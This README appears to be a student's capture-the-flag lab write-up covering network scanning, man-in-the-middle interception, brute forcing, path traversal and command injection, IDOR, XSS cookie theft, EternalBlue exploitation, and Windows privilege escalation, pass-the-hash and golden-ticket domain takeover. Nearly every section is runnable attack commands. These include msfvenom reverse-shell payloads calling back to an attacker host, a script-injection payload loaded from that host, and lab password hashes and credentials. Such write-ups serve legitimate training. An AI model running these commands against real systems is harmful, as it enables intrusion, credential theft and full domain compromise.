# System-attack-and-defense

## Intro - Getting the flag
Used cat cmd: cat /etc/flag.etc
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d2296959-f134-4ee1-a2d0-d8c9b9a38daa)


## Scanning
**Scanning I**
Sending ICMP echo request was used for scan get all active host
nmap -sn -PU21,22,25,80,443,445,3128,5222,6667,3389,8080 10.110.253.0/24
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/89f0bcde-97f1-4baa-8e1d-4a74ff511cb1)

**Scanning II**
I added aggressive scan -A to the operating system enumeration;
Using the cmd: nmap -O -A 10.110.253.0/24 
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/b07de568-8991-41b7-a442-210d7f0aead9)

**Scanning III**
I Used nmap scan and adding ssl-heartbleed to script, specifying port 443 and network range cmd: 
nmap -Pn --script=ssl-heartbleed -p 443 10.110.253.0/24
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/81e82352-bf71-413b-9f1c-62fbf4a7e185)

**Scanning IV**
Crimsonia website was scanned with a purpose-built scanner, Nikto.
Firstly, the line FAILURES = 20 in /etc/nikto.conf was changed to FAILURES = 0 by using the cmd nano /etc/nikto.conf to edit the conf file.
Then the website was scanned with the cmd nikto -host http://www.crimsonia.net/
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/0dc6c1a0-d71f-4a91-9a6b-29d359336ad6)

Seeing that the /config subdomain is accessible, I used the cmd 
curl http://www.crimsonia.net/config/
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/755a9d4d-3c76-4351-b5aa-8159cc26831b)

Then we saw another subdomain MY_fuel.php.bak which we access by using curl http://www.crimsonia.net/config/MY_fuel.php.bak to get the flag

![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/55fdde77-8788-46c1-8ed3-22ffe5642691)


**Scanning V**
a.	Used nano hosts.txt to create a file and hasted all 9 host that is up in the file 
b.	Scanned all host with nmap -v -Pn -iL hosts.txt -sV --script /usr/share/nmap/scripts/http-open-proxy.nse -p1080,3128,8080,8118,8123,8888
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/2c89e03e-416f-41d4-904c-d2d7a1525b6f)

c.	Run curl cmd of the open proxy and port with any website: curl -vv -x http://chat.crimsonia.net:8888/ http://www.google.com/
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d2b04b29-adc3-4da2-bdb3-e5a5b80a4554)


**Scanning VI**
Used the cmd: nmap -6 -sS -sV fe80::f1a6:f1a6:f1a6:f1a6%eth0 -v -p-
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d3943b1b-0582-41d8-9d68-f5ca143c4bc8)

ssh -6 fe80::f1a6:f1a6:f1a6:f1a6%eth0 -p 33445
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/5a0f1d46-e64b-46f9-8963-a4cebbe4ec0b)


## Enumeration
**Enumeration I**
a.	Downloaded the dictionary with cmd: 
wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dnsenum/dnsbig.txt
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/ccee20b3-ca18-494d-8400-f42b37f1a966)

b.	Filtered all passwords having ‘vpn’ and saving it to a file “vpn-dns.txt” using: grep 'vpn' dnsbig.txt > vpn-dns.txt
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/63e20bf8-f1f0-4b4f-b9ff-67541d041001)
 
c.	Brute forced to get the vpn fully qualified domain name with cmd: dnsenum -f vpn-dns.txt --dnsserver 10.110.253.20 crimsonia.net
 ![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/60d12dfe-3998-4044-8f0c-9ef6bbe59891)


**Enumeration II**
Used the cmd to scan for wordpress enumeration:
wpscan --enumerate u --url http://meta.crimsonia.net:8080
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/87a62e8d-b6cb-4496-b373-0392cffb0fdf)


**Enumeration III**
a.	First installed ldns-walk
b.	Replaced X with my student number 28
c.	Executed the cmd ldns-walk -f @10.110.28.68 csc.lab
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/383c160c-c998-410b-85e8-f09270e4f327)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/aba98f76-9cb9-4a60-8599-7d30950b13ae)


## Man-In-The-Middle-Attack
**MitM I**
a.	Enabled packet forwarding with cmd :    
echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
b.	Poisoned the ARP table of client data from server with cmd: arpspoof -i eth0 -t 10.110.28.11 10.110.28.12 
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/b8902c74-f126-4101-a4f9-73da4ef777b5)

c.	Opened a new terminal to observe the traffic with tcpdump cmd:
 tcpdump -vv -nn -i eth0 host 10.110.28.11  
 ![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/2a5d9a9f-1c5f-4e28-8c89-ffc271264e4b)

d.	The observed traffic has a hash code wish can be decoded in base64 using the cmd: echo -n 'amFzb24ucGlua2VyOlJrYllGZzUxcUZYREwzUkg=' | base64 -d 
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/bcc9f925-7c5e-46d6-8654-4e3ad2724724)

e.	The website http://10.110.28.12/ was accessed with the username and password to get the flag as seen:  
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/06c6aa4c-253f-4b62-a5ec-8e5532686069)


**MiTM II**
While spoofing continues from the previous session, I redirect HTTPS traffic entering my Kali machine to the meterproxy using the cmd:
iptables -t nat -A PREROUTING -p tcp --dport 443 --dst 10.110.X.12 -j DNAT --to-destination 10.110.X.200
Then I ran mitmproxy with cmd below, click on the login.php HTTPS POST to get the credential as seen in the screenshot : 
mitmproxy --listen-port 443 --ssl-insecure --mode transparent
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/c6a67968-c1c9-4920-8ff6-58eb36e36761)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/88c3da2f-3a28-42e5-a054-ff588846e25a)

The website 10.110.28.12 was accessed with the credentials seen in the screenshot above, then navigated to passwords tab to capture the flag as seen in the screenshot below
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/801ed901-0969-4803-81e2-196625b555fe)


**MiTM III**
Configured Kali Linux to forward IPv6 packets and drop ICMP6 redirect with the cmd:
echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/528d465a-ea88-4201-9bc1-f9e13f482777)


Used tcpflow to inspect the network traffic and the flag was captured in the traffic.
tcpflow -a -c ‘ip6’
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/2a0cf7d6-6d65-4d12-868a-cce1f2631dfa)


## Credential Attacks
**Credential Attack I**
Using the command below exposed the flag
nc 10.110.28.44 21
HELP ACIDBITCHEZ
id
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d6f03d5b-c488-4d94-b167-8a6a48131890)


**Credential Attack II**
- a.	Write the passwd hash for john to a file.
- b.	Use password list to decrypt hash
- c.	Use the show cmd to display decrypted password
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/b30ffe21-e0b6-482a-859f-b0e1fd27f464)


**Credential Attack III**
a.	Run hydra cmd to get credential: hydra -l commander -P /usr/share/john/password.lst portal.crimsonia.net http-get 
b.	Accessed website with credential exposed
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d244741b-febf-4901-a6de-7d6e79165e31)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/951b8391-dc76-41a3-91ed-d300a8715c4a)



## Web Attacks
Path Traversal
a.	Travelled through path to get to the backup id_rsa with cmd: http://10.110.28.61/?report=....//....//....//....//home/tom/backup/id_rsa 
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/e67d1cf7-6b39-46d2-a6fd-274d6cd5a1a7)

b.	Copied the private key and saved it to my machine: nano tom_id_rsa
c.	Changed the file to readonly by root user: chmod 400 tom_id_rsa 
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/19d9604f-47f5-4c5e-89a1-1d1c62b2ccc1)

d.	Logon to tom’s computer with ssh -i tom_id_rsa tom@10.110.28.61
e.	Got the flag with cat /home/tom/flag.txt  
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/3036599f-c399-4a8f-8423-c227540a5d1f)



**Path Traversal II**
Used the cmd to traverse the site to get the flag:
a.	curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "http://10.110.28.93/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"

b.	curl -s --path-as-is -d "echo Content-Type: text/plain; echo; cat /var/www/flag.txt" "http://10.110.28.93/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/65eba4cd-03ed-4f25-92aa-edb624ca5eab)

 

**Command Injection I**
Visited the site 10.110.28.34/traceroute
Used the cmd: 127.0.0.1 | cat /etc/flag.txt to get the flag
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/ba71d95f-bce5-4266-8533-98139414e211)


## WEB ATTACK II
**Insecure Direct Object Reference I**
Adding “/admin” to end of the unsecured url reveals the admin details and flag.
10.110.28.51/admin
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d88288aa-291b-4a4c-be8c-6ea8ccbbbf0a)


**Insecure Direct Object Reference II**
Used the command to run curl in silent mode, while the variable increases its sequence from 1 to 100 replacing it with users id. Then using grep to capture the users’ messages
for i in $(seq 1 100); do curl -s 'http://10.110.28.52/' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "user_id=$i" | grep "User message" -A1; done
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/4023d08d-d729-471d-b88a-b840b23dc706)


**Insecure Direct Object Reference III** 
Used the cmd below. Similar to thee previous cmd, we pipe md5sum utility. 
for i in $(seq 1 100); do curl -s 'http://10.110.28.53/' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "user_id=$(echo -n $i | md5sum | cut -d' ' -f1)" | grep "User message" -A1; done
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/db1ef9ef-a458-4b49-9861-3c20c6d7b970)


**Insecure Direct Object Reference IV** 
a.	Created an account with Name: Kel, username: admin and passwd: admin
b.	Started a session with cookie saved on my desktop with the cmd: curl -X POST -d 'username=admin&password=admin --cookie cookie.txt --cookie-jar cookie.txt http://10.110.28.54/login
c.	Created a for loop to transfer funds to the account with cmd:
for i in $(seq 1 100);\
   do curl 'http://10.110.28.54/transfer'\
   -X POST\
   -d "from_account=$i&to_account=24&transfer_sum=1000"\
   --cookie cookie.txt\
   --cookie-jar cookie.txt;\
   done
d.	At this point the account was credited with 2000 but the flag didn’t expose, probably because i didn’t use admin as the account name. So i had to create another account with Name: admin, username: admin1 and passwd: admin
e.	I observed that the account numbers are the serial ID, so I transferred 2000 from kel account to admin account and the flag got revealed
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/037d26d9-80b2-440d-bc6b-4d636bad8f7e)


## XSS I

We first test for vulnerability on all inputs textboxes on the website.
Entering the script “<script>alert(1)</script>” on textbox in Reset password page gives a response which shows its vulnerable to attack
Inspecting element on textbox in Reset password page reveals the input ID
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d913fc83-f71c-4c7b-89db-818097b0662e)


## XSS II
a.	Created a payload called xploit.js with the content as seen in the screenshot.
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/b5f67a93-3dda-44d3-ab4e-978ea179fa9f)
 

b.	Selected one of the authors in Forum page and inserted the payload “<script src="http://10.110.28.200/xploit.js"></script>” into the author field including a random message
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/8f1b85a8-865e-4135-8fc1-1eb225189b5d)


c.	Started the python http server with cmd “python -m http.server 80”
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/4b6ea892-fd7c-49ee-919c-3f49044ce90b)
 

d.	Decoded the cookie which is encoded in base 64 to get the flag; echo -n 'UEhQU0VTU0lEPXJocmpkM2ZhM3RpYjdhcHJydG11aG80cG4xOyBmbGFnPUZMQUd7NTA0NjNBNjA4QTU4QjREQjQzODI2NTRENTRCNDZGRDMxQjQ5ODkxREVCNENGMjY4MzFGOEZGQURCOUMwNzk4MX0' | base64 -d
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/8b4121ff-b325-4360-8ef5-9420ea1d29fa)


## Windows Initial Access
**Windows Initial Access I**
Ran nmap for vulnerability: nmap --script vuln 10.110.28.35 which exposed ms17-010
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/55b6ab9b-d1c0-414a-92f2-1881fcbf4c96)
 

Found the Metasploit module with cmd: msfconsole search ms17-010
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/57dec7e6-ac07-45ab-8a8e-63037b0cc303)


Gained access to module with cmd: exploit/windows/smb/ms17_010_psexec
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/82053596-125e-4fdb-9414-9611a5e6c4ea)

Applied the following commands to gain access to shell;
set payload windows/x64/meterpreter/reverse_tcp
set rhosts 10.110.28.35
Exploit
Shell
We access C drive => Downloads => MyEternalFlag.txt has the flag
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/08a61d4d-186d-48a1-9462-9a853b658ab9)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/dd05637e-0f7e-4256-98f5-acda7cbac588)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/752ffd2c-3989-4b3c-91c8-8c64d6806f80)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/bdb6322a-a6f4-42b7-85ab-e279aa1fbb6b)


**Windows Initial Access II**
a.	First scanned for open port with cmd: nmap 10.110.28.10 -p-
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/fa216a90-ddae-4bf9-a229-c2438d7a4ccb)


b.	Download 10000 most used password from github: wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/1909979c-b0aa-4430-b8c9-91feb55a6e18)

c.	Renamed the file name with: mv 10-million-password-list-top-10000.txt wordlist.txt
d.	Brute forced with cmd: hydra -l Mike -P wordlist.txt ssh://10.110.28.10
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/b29c2882-7a3b-40ee-96df-d10f61606b21)
 

e.	Login with username mike and passwd qwert123 using cmd: ssh mike@10.110.28.10
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/872d060b-5c68-43d0-acea-50d0e96de969)
 

f.	Flag is found in .\AppData\
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/67d1de93-9aac-4ce6-98d3-792f76291b39)


## Windows Privilege Escalation
**Windows Privilege Escalation I** 
a.	Accessed the machine with Mike’s credential (password Videoerty123)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/77609da4-ad63-4c2b-8cf6-a6e6165d6a84)

 
b.	Got the unattended.xml file from C:\Windows\Panther with cmd: cd C:\Windows\Panther
c.	Using cat cmd to view xml file 
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/31608c50-45ad-46e1-9042-0d412e01a84f)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/322babd6-a7d6-4731-a5a1-24672a43d815)

 
d.	Decoding the base64 hash with cmd: echo 'WgBOAHgAagBHAHcAZABpAFAAYQBtAEwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBQAGEAcwBzAHcAbwByAGQA' | base64 --decode
Reveals the password: ZNxjGwdiPamL
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/8445f1de-3034-418b-a3fd-abb557223cba)


e.	Login with username: administrator and the password ZNxjGwdiPamL
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/240827f7-d524-48c4-b1f2-698387b77548)
 

f.	Flag is found in music folder
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/024b037f-90d5-4805-b643-df5cd08f88fb)


**Windows Privilege Escalation II** 
a.	Used the following cmd to create a payload:
msfconsole
use exploit/multi/handler
set LHOST 10.110.28.200
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 4444
set ExitOnSession false
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='10.110.28.200' LPORT='4444' -f exe -o payload.exe[*] exec: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='10.110.28.200' LPORT='4444' -f exe -o payload.exe
b.	On another terminal, copy to payload to Mike’s machine with cmd: ssh mike@10.110.28.30 (password: qwerty123)
c.	Execute payload from Mike’s machine .\payloaod.exe
d.	Then back to the first terminal and run the cmds to exploit, get meterpreter session and get the flag:
use exploit/windows/local/service_permissions
Set session 1
exploit 
cd C:\Users\Administrator
dir/s *flag*
cd favorites
type MyServiceFlag.txt
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d6c1d375-ca37-4695-a269-846ca7e88cf6)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/b1cf6e77-86f5-442d-9ee2-50fecb59e142)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/1e58a7dc-f2cb-4a68-bae9-d9f92fac44f6)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/2b13a9af-96e8-46fb-8a75-7a995fb42af1)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/dbc2ecc1-45b6-46ab-8e2a-c3042413d4bd)


## Windows Pass the Hash 
a.	Run the following cmd to create a payload
Msfconsole
set LHOST 10.110.28.200
set payload windows/x64/meterpreter/reverse_tcp
set LPORT '5454'
set ExitOnSession false
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='10.110.28.200' LPORT='5454' -f exe -o payload.exe
b.	Moved the payload to 10.110.28.40 with: 
scp payload.exe Bob@10.110.28.40:/C:/Users/Bob
c.	Run the following cmd to get  a session and hashdump
use exploit/multi/handler
exploit
run -j
Session -i 1
hashdump
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/e44c3486-bfbc-45be-896b-1b24709e9bfe)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/bf90b765-9ffa-4474-bae7-804fe0c9569a)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/fd55d62f-6759-4bcd-9dd4-81eb6801005a)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/79a0b071-d220-4c2c-93d3-7113d026174d)

 
d.	On a new terminal, I ran metasploit and set smb user and password with the administrator hashdump, accessed the system to get the flag:
Msfconsole
use windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set lport 5555
set rhost 10.110.28.70
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:35698da376367f675299cdadbe5c30dc
exploit
search -f *flag*
shell 
cd c:\Users\Administrator\.ssh\  
type MyLateralFlag.txt
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/6f46d9f3-bbe9-4199-9153-ea101db057d1)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/ed14b843-56b5-4f42-8efe-a785f2d8375a)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/037e4360-7341-4437-8bff-d12562a6b6ad)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/80516c9c-af49-4f72-9c24-809c2a78cd74)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/c985baa9-91a5-445a-97dc-161df2bad940)


## Windows Domain Takeover
**Windows Domain Takeover I** 
Used hydra cmd to obtain Dave’s password as seen in the screenshot 
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/919bc88d-248a-4a13-8a92-af3abffb12f2)


Uses the following cmds for creating payload and privilege escalation.
Msfconsole
use exploit/multi/handler
set LHOST 10.110.28.200
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 4444
set ExitOnSession false
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='10.110.28.200' LPORT='4444' -f exe -o payload.exe[*] exec: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='10.110.28.200' LPORT='4444' -f exe -o payload.exe
On a second terminal ssh Dave@10.110.28.80 (password: gogogo)
.\payloaod.exe
Then back to the first terminal;
use exploit/windows/local/service_permissions
Set session 1
exploit 
cd C:\Users\Administrator
dir/s *flag*
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/1c8b67e0-b318-444e-8774-d1c4b3008f19)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/41dd196d-7e53-4ed6-b171-7c92d11fbdb1)

 
**Windows Domain Takeover II**
From the previous meterepreter session, get hashdump with cmd: run post/windows/gather/hasdump
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/b80bba9a-ea89-4975-a800-0c1067b2843e)


On a new terminal, run the following:
msfconsole
use exploit/windows/smb/psexec 
set rhosts 10.110.28.60
set SMBUser Administrator
set payload windows/x64/meterpreter/reverse_tcp
set SMBPass aad3b435b51404eeaad3b435b51404ee:39de00a6a2a5fe74121df703176e014b
exploit
search -f *flag*
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/108c3d58-4135-419f-b383-9b4bd92677a1)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/d432cd60-8a1f-4fea-baf4-acf5cf8e9921)
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/2f0a0943-1873-4f28-8055-032680c6872f)



**Windows Domain Takeover III** 
Krbtgt is in same location with the flag
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/f583fe59-3f41-4833-be25-89f7dc5f8083)

  
Used cmd to access file: type krbtgt.txt
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/da00fb6c-16ae-41fc-a872-63b0236a14fe)
 

Loaded kiwi with cmd: load kiwi
Created a golden ticket: golden_ticket_create -u 'Administrator' -d 'crimsonia.net' -k '23197c205f70a4137b2d4aadb72d8ee3' -s 'S-1-5-21-522893000-456512031-3203732078' -t 'C:\Onyeka\kelvin'
Used Kerberos on ticket: kerberos_ticket_use 'C:\Onyeka\kelvin'
![image](https://github.com/ookelvyn/System-attack-and-defense/assets/30266503/8d49a282-e21a-4c51-81cc-fc6f7fad7f6e)
 

